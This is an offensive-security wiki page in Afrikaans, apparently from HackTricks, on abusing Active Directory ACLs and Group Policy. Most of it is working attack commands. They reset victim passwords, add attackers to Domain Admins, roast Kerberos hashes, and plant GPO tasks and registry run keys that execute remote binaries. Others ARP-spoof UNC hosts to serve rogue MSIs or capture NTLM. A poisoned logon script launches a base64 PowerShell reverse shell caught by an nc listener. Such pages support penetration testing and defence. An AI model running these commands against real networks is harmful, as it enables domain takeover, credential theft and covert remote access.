# Misbruik van Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Hierdie bladsy is meestal ’n opsomming van die tegnieke van** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **en** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Vir meer besonderhede, kyk na die oorspronklike artikels.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Hierdie voorreg gee ’n aanvaller volle beheer oor ’n teiken-gebruikersrekening. Sodra `GenericAll` regte met die `Get-ObjectAcl`-opdrag bevestig is, kan ’n aanvaller:

- **Verander die Teiken se Wagwoord**: Met `net user <username> <password> /domain` kan die aanvaller die gebruiker se wagwoord herstel.
- Van Linux af kan jy dieselfde oor SAMR doen met Samba `net rpc`:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **As die rekening gedeaktiveer is, maak die UAC-vlag skoon**: `GenericAll` laat die wysiging van `userAccountControl` toe. Vanaf Linux kan BloodyAD die `ACCOUNTDISABLE`-vlag verwyder:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: Wys 'n SPN aan die gebruiker se rekening toe om dit kerberoastable te maak, gebruik dan Rubeus en targetedKerberoast.py om die ticket-granting ticket (TGT) hashes te onttrek en te probeer kraak.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Deaktiveer pre-authentication vir die gebruiker, wat hul rekening kwesbaar maak vir ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: Met `GenericAll` op 'n gebruiker kan jy 'n sertifikaat-gebaseerde credential byvoeg en as hulle authenticate sonder om hul wagwoord te verander. Sien:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll Rights on Group**

Hierdie privilege laat 'n attacker toe om group memberships te manipuleer as hulle `GenericAll` rights op 'n group soos `Domain Admins` het. Nadat die group's distinguished name met `Get-NetGroup` geïdentifiseer is, kan die attacker:

- **Add Themselves to the Domain Admins Group**: Dit kan gedoen word via direkte commands of deur modules soos Active Directory of PowerSploit te gebruik.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Vanuit Linux kan jy ook BloodyAD gebruik om jouself by arbitrêre groepe te voeg wanneer jy GenericAll/Write membership daaroor het. As die teikengroep genest is in “Remote Management Users”, sal jy onmiddellik WinRM-toegang kry op hosts wat daardie groep eerbiedig:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Deur hierdie voorregte op `n computer object` of `n user account` te hê, maak dit moontlik om:

- **Kerberos Resource-based Constrained Delegation**: Laat toe om `n computer object` oor te neem.
- **Shadow Credentials**: Gebruik hierdie tegniek om `n computer of user account` te impersonate deur die voorregte te benut om shadow credentials te skep.

## **WriteProperty on Group**

As `n gebruiker `WriteProperty` regte op alle objects vir `n spesifieke group het (bv. `Domain Admins`), kan hulle:

- **Voeg Hulself by die Domain Admins Group**: Dit is moontlik deur `net user` en `Add-NetGroupUser` commands te kombineer; hierdie metode laat privilege escalation binne die domain toe.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Lidmaatskap) op Groep**

Hierdie voorreg stel aanvallers in staat om hulself by spesifieke groepe, soos `Domain Admins`, te voeg deur opdragte te gebruik wat groepslidmaatskap direk manipuleer. Die volgende opdragvolgorde maak self-toevoeging moontlik:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

’n Soortgelyke voorreg, dit laat aanvallers toe om hulleself direk by groepe te voeg deur groep-eienskappe te wysig as hulle die `WriteProperty` reg op daardie groepe het. Die bevestiging en uitvoering van hierdie voorreg word uitgevoer met:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Om die `ExtendedRight` op `n gebruiker vir `User-Force-Change-Password` te hê, laat wagwoord-terugstellings toe sonder om die huidige wagwoord te ken. Verifikasie van hierdie reg en die uitbuiting daarvan kan via PowerShell of alternatiewe command-line tools gedoen word, wat verskeie metodes bied om `n gebruiker se wagwoord terug te stel, insluitend interaktiewe sessions en one-liners vir nie-interaktiewe omgewings. Die commands strek van eenvoudige PowerShell-invocations tot die gebruik van `rpcclient` op Linux, wat die veelsydigheid van attack vectors demonstreer.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner op Groep**

As ’n aanvaller vind dat hulle `WriteOwner` regte oor ’n groep het, kan hulle die eienaarskap van die groep na hulself verander. Dit is veral impakvol wanneer die betrokke groep `Domain Admins` is, aangesien die verandering van eienaarskap breër beheer oor groep-attribuut en lidmaatskap moontlik maak. Die proses behels die identifisering van die korrekte objek via `Get-ObjectAcl` en dan die gebruik van `Set-DomainObjectOwner` om die eienaar te wysig, óf by wyse van SID óf naam.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite op User**

Hierdie toestemming laat ’n aanvaller toe om gebruiker-eienskappe te wysig. Spesifiek, met `GenericWrite`-toegang kan die aanvaller die aanmeldscript-pad van ’n gebruiker verander om ’n kwaadwillige script uit te voer wanneer die gebruiker aanmeld. Dit word bereik deur die `Set-ADObject`-opdrag te gebruik om die `scriptpath`-eienskap van die teikengebruiker by te werk sodat dit na die aanvaller se script wys.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite op Group**

Met hierdie voorreg kan aanvallers groep-lidmaatskap manipuleer, soos om hulself of ander gebruikers by spesifieke groups te voeg. Hierdie proses behels die skep van ’n credential object, dit gebruik om gebruikers by ’n group te voeg of te verwyder, en die verifikasie van die lidmaatskapveranderings met PowerShell commands.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Vanaf Linux kan Samba `net` lede byvoeg/verwyder wanneer jy `GenericWrite` op die groep het (nuttig wanneer PowerShell/RSAT nie beskikbaar is nie):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

Om 'n AD-objek te besit en `WriteDACL`-voorregte daarop te hê, stel 'n aanvaller in staat om vir hulself `GenericAll`-voorregte oor die objek toe te ken. Dit word bereik deur ADSI-manipulasie, wat volle beheer oor die objek en die vermoë om sy groep-lidmaatskappe te wysig moontlik maak. Ten spyte hiervan bestaan daar beperkings wanneer daar gepoog word om hierdie voorregte te ontgin met die Active Directory module se `Set-Acl` / `Get-Acl` cmdlets.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner quick takeover (PowerView)

Wanneer jy `WriteOwner` en `WriteDacl` oor 'n gebruiker of diensrekening het, kan jy volle beheer neem en sy wagwoord herstel met PowerView sonder om die ou wagwoord te ken:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
Notes:
- Jy mag dalk eers die eienaar na jouself moet verander as jy slegs `WriteOwner` het:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- Valideer toegang met enige protokol (SMB/LDAP/RDP/WinRM) na wagwoord herstel.

## **Replication on the Domain (DCSync)**

Die DCSync-aanval gebruik spesifieke repliseringspermissies op die domain om ’n Domain Controller na te boots en data te sinkroniseer, insluitend gebruikerbewyse. Hierdie kragtige tegniek vereis permissies soos `DS-Replication-Get-Changes`, wat aanvallers toelaat om sensitiewe inligting uit die AD-omgewing te onttrek sonder direkte toegang tot ’n Domain Controller. [**Leer meer oor die DCSync-aanval hier.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Gedelegeerde toegang om Group Policy Objects (GPOs) te bestuur kan beduidende sekuriteitsrisiko's inhou. Byvoorbeeld, as ’n gebruiker soos `offense\spotless` GPO-bestuursregte gedelegeer kry, kan hulle voorregte hê soos **WriteProperty**, **WriteDacl**, en **WriteOwner**. Hierdie permissies kan vir kwaadwillige doeleindes misbruik word, soos geïdentifiseer met PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Om verkeerd gekonfigureerde GPOs te identifiseer, kan PowerSploit se cmdlets aanmekaar gekoppel word. Dit maak die ontdekking moontlik van GPOs wat ’n spesifieke gebruiker mag bestuur: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: Dit is moontlik om te bepaal op watter computers ’n spesifieke GPO van toepassing is, wat help om die omvang van moontlike impak te verstaan. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: Om te sien watter policies op ’n spesifieke computer toegepas is, kan opdragte soos `Get-DomainGPO` gebruik word.

**OUs with a Given Policy Applied**: Die identifisering van organizational units (OUs) wat deur ’n gegewe policy geraak word, kan met behulp van `Get-DomainOU` gedoen word.

Jy kan ook die tool [**GPOHound**](https://github.com/cogiceo/GPOHound) gebruik om GPOs te enumerteer en probleme daarin te vind.

### Abuse GPO - New-GPOImmediateTask

Verkeerd gekonfigureerde GPOs kan uitgebuit word om code uit te voer, byvoorbeeld deur ’n onmiddellike geskeduleerde taak te skep. Dit kan gedoen word om ’n gebruiker by die local administrators group op geaffekteerde machines te voeg, wat privileges aansienlik verhoog:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Die GroupPolicy module, indien geïnstalleer, laat toe vir die skepping en koppeling van nuwe GPOs, en die instelling van voorkeure soos registerwaardes om backdoors op geaffekteerde rekenaars uit te voer. Hierdie metode vereis dat die GPO opgedateer word en dat 'n gebruiker by die rekenaar aanmeld vir uitvoering:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse bied 'n metode om bestaande GPOs te abuse deur take by te voeg of instellings te wysig sonder die behoefte om nuwe GPOs te skep. Hierdie tool vereis wysiging van bestaande GPOs of die gebruik van RSAT tools om nuwe een te skep voordat veranderinge toegepas word:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO-opdaterings vind gewoonlik ongeveer elke 90 minute plaas. Om hierdie proses te bespoedig, veral ná die implementering van ’n verandering, kan die `gpupdate /force`-opdrag op die teikenrekenaar gebruik word om ’n onmiddellike beleidopdatering af te dwing. Hierdie opdrag verseker dat enige wysigings aan GPOs toegepas word sonder om vir die volgende outomatiese opdateringssiklus te wag.

### Under the Hood

By inspeksie van die Scheduled Tasks vir ’n gegewe GPO, soos die `Misconfigured Policy`, kan die toevoeging van take soos `evilTask` bevestig word. Hierdie take word geskep deur skripte of command-line tools wat daarop gemik is om stelselgedrag te wysig of regte te eskaleer.

Die struktuur van die taak, soos getoon in die XML-konfigurasielêer wat deur `New-GPOImmediateTask` gegenereer word, skets die besonderhede van die geskeduleerde taak - insluitend die opdrag wat uitgevoer moet word en sy triggers. Hierdie lêer stel voor hoe geskeduleerde take binne GPOs gedefinieer en bestuur word, en bied ’n metode om arbitrêre opdragte of skripte uit te voer as deel van beleidafdwinging.

### Users and Groups

GPOs laat ook toe dat user- en group-lidmaatskappe op teikenstelsels gemanipuleer word. Deur die Users and Groups-beleidslêers direk te wysig, kan aanvallers users by bevoorregte groups voeg, soos die plaaslike `administrators` group. Dit is moontlik deur die delegasie van GPO-bestuursregte, wat die wysiging van beleidslêers toelaat om nuwe users in te sluit of group-lidmaatskap te verander.

Die XML-konfigurasielêer vir Users and Groups skets hoe hierdie veranderinge geïmplementeer word. Deur inskrywings by hierdie lêer te voeg, kan spesifieke users verhoogde regte oor geaffekteerde stelsels kry. Hierdie metode bied ’n direkte benadering tot privilege escalation deur GPO-manipulasie.

Verder kan addisionele metodes vir die uitvoer van code of die handhawing van persistence, soos die gebruik van logon/logoff scripts, die wysiging van registry keys vir autoruns, die installering van software via .msi-lêers, of die wysiging van service-konfigurasies, ook oorweeg word. Hierdie tegnieke bied verskeie maniere om toegang te behou en teikenstelsels te beheer deur die abuse van GPOs.

### WriteGPLink + UNC path hijacking (ARP spoofing)

`WriteGPLink` oor ’n OU/domain laat jou toe om die teikenhouer se `gPLink`-attribuut te wysig en **’n bestaande GPO te dwing om toegepas te word** sonder om die GPO self te wysig. Dit word interessant wanneer die gekoppelde GPO reeds na remote content oor **UNC paths** (`\\HOST\share\...`) verwys, omdat geauthenticeerde users **SYSVOL** kan lees en herbruikbare policies offline kan soek.

Hoëvlak-werkvloei:

1. Gebruik BloodHound om ’n principal met `WriteGPLink` oor ’n OU te identifiseer en computers/users binne daardie OU te lys.
2. Kloon `SYSVOL` read-only en ontleed GPOs vir **Software Installation**, **drive mappings** (`Drives.xml`), en **logon/startup scripts** wat na UNC paths verwys.
3. Verkies policies wat na ’n **direct hostname** wys (byvoorbeeld `\\DC02\share\pkg.msi`) in plaas van DFS/domain-namespace paths, omdat hostname-gebaseerde paths makliker is om met L2-spoofing te herlei.
4. Voeg die gekose GPO GUID by die teiken OU se `gPLink` sodat die slagoffer daardie reeds-bestaande policy verwerk.
5. Op dieselfde broadcast domain, ARP-spoof die UNC host en bind sy IP plaaslik (`ip addr add <target_ip>/32 dev <iface>`) sodat die slagoffer se SMB traffic na jou host toe gaan.
6. Bedien die verwagte path/filename vanaf ’n aanvaller SMB-server (byvoorbeeld `smbserver.py`) en wag vir normale policy processing.

Voorbeeld van `SYSVOL`-versameling en GPO-korrelasie:
```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```
Koppel die bestaande GPO aan die teiken OU:
```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
--gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```
#### Software Installation UNC hijack -> SYSTEM

As die gekoppelde GPO 'n MSI vanaf 'n UNC-pad ontplooi, sal die kliënt dit tydens **computer startup** haal en dit as **`NT AUTHORITY\SYSTEM`** installeer. Deur die verwysde gasheer te spoof en 'n kwaadwillige MSI onder dieselfde **share/path/name** te bedien, kan jy **WriteGPLink** in SYSTEM code execution omskep **sonder om SYSVOL te wysig**.

Belangrike beperkings:

- **Timing matters**: die nuwe skakel word by policy refresh gesien (gewoonlik ~90 minute), maar **Software Installation** word gewoonlik op **reboot** geaktiveer.
- Windows Installer hou die ontplooiing dikwels dop met die package **`ProductCode`**. As die product reeds geïnstalleer is, kan ontplooiing oorgeslaan word.
- Om installer rejection te vermy, patch die rogue MSI sodat sy **`ProductCode`** en **`PackageCode`** ooreenstem met die wettige package wat deur die GPO verwag word.
- Ou `.aas` advertisement files kan in **SYSVOL** oorbly, so valideer dat die ontplooiing steeds aktief lyk voordat jy daarop staatmaak.
```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```
#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP drive mappings in `Drives.xml` veroorsaak dat users tydens logon of herverbinding by die gekonfigureerde UNC path authenticate. As jy die verwysde host spoof, kan jy **NetNTLMv2** capture. As SMB doelbewus laat fail word, kan Windows dalk oor **WebDAV** retry, en **NTLM oor HTTP** stuur, wat baie meer buigsaam is vir relays na **LDAP(S)**, **AD CS**, of **SMB**.

#### Logon/startup script UNC hijack

Dieselfde patroon geld vir UNC-gehoste scripts wat in `SYSVOL` ontdek word:

- **Logon scripts** execute gewoonlik in die **user** context.
- **Startup scripts** execute gewoonlik in die **computer / SYSTEM** context.

As die script path na 'n spoofable hostname wys, redirect die UNC host en serve replacement script content vanaf die verwagte location.

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths onder `\\<dc>\SYSVOL\<domain>\scripts\` of `\\<dc>\NETLOGON\` laat tampering met logon scripts toe wat via GPO by user logon uitgevoer word. Dit lewer code execution in die security context van logging users.

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- Crawl domein-deelde om kortpaaie of verwysings na scripts te vind:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- Ontleed `.lnk` files om teikens wat na SYSVOL/NETLOGON wys op te los (nuttige DFIR-truuk en vir aanvallers sonder direkte GPO-toegang):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound vertoon die `logonScript` (scriptPath) attribuut op user nodes wanneer dit teenwoordig is.

### Valideer skryf-toegang (moenie share listings vertrou nie)
Geoutomatiseerde tooling mag SYSVOL/NETLOGON as read-only wys, maar onderliggende NTFS ACLs kan steeds writes toelaat. Toets altyd:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
As lêergrootte of mtyd verander, het jy skryf-toegang. Bewaar oorspronklikes voordat jy wysig.

### Vergiftig 'n VBScript-aanmeldskrip vir RCE
Voeg 'n opdrag by wat 'n PowerShell reverse shell begin (genereer vanaf revshells.com) en behou die oorspronklike logika om besigheidsfunksie nie te breek nie:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
Luister op jou gasheer en wag vir die volgende interaktiewe aanmelding:
```bash
rlwrap -cAr nc -lnvp 443
```
Notes:
- Uitvoering vind plaas onder die logging user se token (nie SYSTEM nie). Omvang is die GPO skakel (OU, site, domain) wat daardie script toepas.
- Maak skoon deur die oorspronklike inhoud/timestamps na gebruik te herstel.


## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)

{{#include ../../../banners/hacktricks-training.md}}
